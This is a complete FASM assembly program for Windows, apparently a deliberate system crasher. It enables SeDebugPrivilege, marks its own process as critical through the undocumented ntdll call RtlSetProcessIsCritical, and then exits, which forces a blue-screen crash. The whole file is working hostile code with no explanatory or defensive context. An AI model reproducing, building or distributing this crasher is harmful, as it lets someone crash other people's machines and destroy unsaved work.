format PE GUI 4.0
include 'win32a.inc'

lea     eax, [esp+20]
invoke  RtlAdjustPrivilege, 20, 1, 0, eax
invoke  RtlSetProcessIsCritical, 1, 0, 0
invoke  ExitProcess, 0

data import
    library \
        kernel32, 'kernel32', \
        ntdll, 'ntdll'
    import kernel32, \
        ExitProcess, 'ExitProcess'
    import ntdll, \
        RtlAdjustPrivilege, 'RtlAdjustPrivilege', \
        RtlSetProcessIsCritical, 'RtlSetProcessIsCritical'
end data